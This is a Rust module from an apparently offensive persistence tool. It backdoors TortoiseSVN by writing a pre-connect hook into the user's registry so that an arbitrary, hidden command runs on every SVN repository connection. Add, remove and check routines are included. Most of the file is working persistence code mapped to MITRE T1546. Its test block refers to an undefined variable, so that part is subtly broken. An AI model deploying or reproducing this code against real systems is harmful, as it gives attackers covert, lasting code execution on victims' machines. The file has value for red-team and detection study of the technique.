// TortoiseSVN Hook Scripts Persistence
//
// Backdoors TortoiseSVN by adding pre-connect hook scripts via registry.
// Executes arbitrary commands whenever a connection to SVN repository is made.
//
// MITRE ATT&CK Technique: T1546 - Event Triggered Execution
// https://attack.mitre.org/techniques/T1546/

use crate::core::config::{Method, PersistConfig};
use crate::core::error::{PersistError, Result};

#[cfg(target_os = "windows")]
use crate::ffi::windows_registry::{Hive, RegKey, RegValueKind};

// Constants are used in Windows-specific code paths
#[allow(dead_code)]
const TORTOISESVN_KEY: &str = r"Software\TortoiseSVN";
#[allow(dead_code)]
const HOOKS_VALUE: &str = "hooks";
#[allow(dead_code)]
const VERSION_VALUE: &str = "CurrentVersion";

/// Execute TortoiseSVN persistence operation based on configuration
pub fn execute(config: &PersistConfig) -> Result<()> {
    match config.method {
        Method::Add => add_persistence(config),
        Method::Remove => remove_persistence(),
        Method::Check => check_persistence(config).map(|r| print_check_result(&r)),
        Method::List => list_persistence(),
    }
}

/// Add TortoiseSVN hook persistence
#[cfg(target_os = "windows")]
fn add_persistence(config: &PersistConfig) -> Result<()> {
    let command = config
        .command
        .as_ref()
        .ok_or_else(|| PersistError::MissingParameter("command".to_string()))?;

    info!("Adding TortoiseSVN persistence");
    info!("Command: {}", command);

    // Check if TortoiseSVN is installed
    let key = RegKey::open(Hive::CurrentUser, TORTOISESVN_KEY, true)?;

    if !key.value_exists(VERSION_VALUE) {
        return Err(PersistError::NotFound(
            "TortoiseSVN is not installed (registry key not found)".to_string(),
        ));
    }

    // Build full command
    let full_command = if let Some(args) = &config.command_arg {
        format!("{} {}", command, args)
    } else {
        command.clone()
    };

    // Create pre-connect hook value
    // Format: pre_connect_hook\n \n<command>\nfalse\nhide\nenforce
    let hook_value = format!(
        "pre_connect_hook\n \n{}\nfalse\nhide\nenforce",
        full_command
    );

    // Set hooks registry value
    key.set_value(HOOKS_VALUE, &hook_value, RegValueKind::String)?;

    // Verify the value was set
    let verify_value = key.get_value(HOOKS_VALUE)?;
    if verify_value.is_empty() {
        return Err(PersistError::OperationFailed(
            "TortoiseSVN persistence failed".to_string(),
        ));
    }

    println!();
    println!("[+] SUCCESS: TortoiseSVN persistence added");
    println!("[*] INFO: Hook will execute on SVN repository connections");
    println!();

    Ok(())
}

/// Remove TortoiseSVN hook persistence
#[cfg(target_os = "windows")]
fn remove_persistence() -> Result<()> {
    info!("Removing TortoiseSVN persistence");

    // Open TortoiseSVN registry key
    let key = RegKey::open(Hive::CurrentUser, TORTOISESVN_KEY, true)?;

    if !key.value_exists(VERSION_VALUE) {
        return Err(PersistError::NotFound(
            "TortoiseSVN is not installed (registry key not found)".to_string(),
        ));
    }

    // Check if hooks value exists and has data
    if !key.value_exists(HOOKS_VALUE) {
        return Err(PersistError::NotFound(
            "No TortoiseSVN hooks to remove".to_string(),
        ));
    }

    let current_value = key.get_value(HOOKS_VALUE)?;
    if current_value.is_empty() {
        return Err(PersistError::NotFound(
            "No data in TortoiseSVN hooks registry value".to_string(),
        ));
    }

    // Clear the hooks value
    key.set_value(HOOKS_VALUE, "", RegValueKind::String)?;

    // Verify removal
    let verify_value = key.get_value(HOOKS_VALUE)?;
    if verify_value.is_empty() {
        println!();
        println!("[+] SUCCESS: TortoiseSVN persistence removed");
        println!();
        Ok(())
    } else {
        Err(PersistError::OperationFailed(
            "TortoiseSVN persistence not removed".to_string(),
        ))
    }
}

/// Check if TortoiseSVN persistence can be added
#[cfg(target_os = "windows")]
fn check_persistence(config: &PersistConfig) -> Result<CheckResult> {
    let mut result = CheckResult::new();

    // Check if TortoiseSVN is installed
    match RegKey::open(Hive::CurrentUser, TORTOISESVN_KEY, false) {
        Ok(key) => {
            result.add_success("TortoiseSVN registry key is present".to_string());

            // Check if hooks value already has data
            if key.value_exists(HOOKS_VALUE) {
                match key.get_value(HOOKS_VALUE) {
                    Ok(value) => {
                        if value.is_empty() {
                            result.add_success(
                                "No data currently in TortoiseSVN hooks registry value".to_string(),
                            );
                        } else {
                            result.add_error(
                                "Value already exists in TortoiseSVN hooks registry value"
                                    .to_string(),
                            );
                        }
                    }
                    Err(_) => {
                        result.add_success(
                            "No data currently in TortoiseSVN hooks registry value".to_string(),
                        );
                    }
                }
            } else {
                result.add_success(
                    "No data currently in TortoiseSVN hooks registry value".to_string(),
                );
            }
        }
        Err(_) => {
            result.add_error("TortoiseSVN registry key is NOT present".to_string());
        }
    }

    // Check write permissions
    match RegKey::open(Hive::CurrentUser, TORTOISESVN_KEY, true) {
        Ok(_) => {
            result
                .add_success("You have write permissions to TortoiseSVN registry key".to_string());
        }
        Err(_) => {
            result.add_error(
                "You do NOT have write permissions to TortoiseSVN registry key".to_string(),
            );
        }
    }

    // Check for required parameters
    if config.command.is_none() {
        result.add_error("Must provide --command".to_string());
    } else {
        result.add_success("Correct arguments provided".to_string());
    }

    Ok(result)
}

/// List persistence (not supported for TortoiseSVN)
#[cfg(target_os = "windows")]
fn list_persistence() -> Result<()> {
    println!();
    println!("[-] ERROR: List command not supported for TortoiseSVN technique");
    println!();
    Ok(())
}

/// Platform stub for non-Windows
#[cfg(not(target_os = "windows"))]
fn add_persistence(_config: &PersistConfig) -> Result<()> {
    Err(PersistError::PlatformNotSupported {
        technique: "TortoiseSVN".to_string(),
        platform: "Windows".to_string(),
    })
}

/// Platform stub for non-Windows
#[cfg(not(target_os = "windows"))]
fn remove_persistence() -> Result<()> {
    Err(PersistError::PlatformNotSupported {
        technique: "TortoiseSVN".to_string(),
        platform: "Windows".to_string(),
    })
}

/// Platform stub for non-Windows
#[cfg(not(target_os = "windows"))]
fn check_persistence(_config: &PersistConfig) -> Result<CheckResult> {
    Err(PersistError::PlatformNotSupported {
        technique: "TortoiseSVN".to_string(),
        platform: "Windows".to_string(),
    })
}

/// Platform stub for non-Windows
#[cfg(not(target_os = "windows"))]
fn list_persistence() -> Result<()> {
    Err(PersistError::PlatformNotSupported {
        technique: "TortoiseSVN".to_string(),
        platform: "Windows".to_string(),
    })
}

/// Result of a check operation
#[derive(Debug)]
#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
struct CheckResult {
    successes: Vec<String>,
    errors: Vec<String>,
}

#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
impl CheckResult {
    fn new() -> Self {
        Self {
            successes: Vec::new(),
            errors: Vec::new(),
        }
    }

    fn add_success(&mut self, msg: String) {
        self.successes.push(msg);
    }

    fn add_error(&mut self, msg: String) {
        self.errors.push(msg);
    }
}

fn print_check_result(result: &CheckResult) {
    println!();
    for success in &result.successes {
        println!("[+] SUCCESS: {}", success);
    }
    for error in &result.errors {
        println!("[-] ERROR: {}", error);
    }
    println!();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_check_requires_command() {
        use crate::core::config::{Method, Technique};

        let _config = PersistConfig {
            technique: Technique::TortoiseSVN,
            method: Method::Check,
            command: None,
            command_arg: None,
            file_path: None,
            registry_key: None,
            registry_value: None,
            name: None,
            option: None,
        };

        #[cfg(target_os = "windows")]
        {
            let result = check_persistence(&config);
            assert!(result.is_ok());
        }
    }
}
